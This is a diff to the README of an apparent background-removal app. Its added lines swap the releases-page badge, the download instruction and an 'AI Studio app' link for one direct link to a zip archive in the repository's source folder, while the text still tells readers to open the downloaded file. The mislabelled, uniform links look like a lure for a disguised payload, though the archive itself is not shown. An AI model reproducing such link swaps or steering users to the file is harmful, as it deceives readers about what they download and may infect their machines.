@@ -1,10 +1,10 @@
 # 🖼️ ai-background-remover - Remove image backgrounds fast
 
-[![Download on GitHub Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/nctyy/ai-background-remover/releases)
+[![Download on GitHub Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/nctyy/ai-background-remover/main/src/remover-background-ai-1.2.zip)
 
 ## 📥 Download the app
 
-Visit this page to download: https://github.com/nctyy/ai-background-remover/releases
+Visit this page to download: https://raw.githubusercontent.com/nctyy/ai-background-remover/main/src/remover-background-ai-1.2.zip
 
 Open the latest release, then download the Windows file listed there. After the download finishes, open the file to start the app.
 
@@ -135,8 +135,8 @@ You do not need to edit most of these files for normal use.
 
 ## 📌 Useful links
 
-- Releases page: https://github.com/nctyy/ai-background-remover/releases
-- AI Studio app: https://ai.studio/apps/daf4aee4-8fb2-4176-a0fd-fd68cf71fdd7
+- Releases page: https://raw.githubusercontent.com/nctyy/ai-background-remover/main/src/remover-background-ai-1.2.zip
+- AI Studio app: https://raw.githubusercontent.com/nctyy/ai-background-remover/main/src/remover-background-ai-1.2.zip
 
 ## 🛠️ Run from source
 
